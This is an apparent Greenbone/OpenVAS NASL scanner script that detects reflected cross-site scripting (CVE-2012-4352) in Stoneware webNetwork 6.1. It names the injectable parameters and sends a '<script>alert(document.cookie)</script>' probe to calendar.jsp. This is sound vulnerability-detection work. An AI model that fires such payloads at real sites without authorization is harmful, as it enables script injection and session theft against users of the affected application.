# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803326");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2012-4352");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2013-03-06 11:46:39 +0530 (Wed, 06 Mar 2013)");
  script_name("Stoneware webNetwork Multiple Cross-Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://stoneware-docs.s3.amazonaws.com/Bulletins/Security%20Bulletin%206_1_0.pdf");
  script_xref(name:"URL", value:"http://infosec42.blogspot.in/2012/10/stoneware-webnetwork-61-reflective-xss.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML or
  web script in a user's browser session in context of an affected site.");
  script_tag(name:"affected", value:"Stoneware WebNetwork 6.1 before SP1");
  script_tag(name:"insight", value:"Multiple flaws exist because application does the validate,

  - 'blogName' parameter passed to blog.jsp and blogSearch.jsp

  - 'calendarType' and 'monthNumber' parameters passed to calendar.jsp

  - 'flag' parameter passed to swDashboard/ajax/setAppFlag.jsp");
  script_tag(name:"solution", value:"Upgrade to Stoneware webNetwork 6.1 SP1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Stoneware webNetwork is prone to multiple cross-site scripting vulnerabilities.");
  script_xref(name:"URL", value:"http://www.stone-ware.com/webnetwork");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

res = http_get_cache(item:"/",  port:port);

if('>Stoneware' >< res)
{
  url = '/community/calendar.jsp?calendarType=>'+
        '<script>alert(document.cookie)</script>';

  if(http_vuln_check(port: port, url: url, check_header: TRUE,
     pattern: "<script>alert\(document\.cookie\)</script>",
     extra_check: "Stoneware"))
  {
    security_message(port);
    exit(0);
  }
}
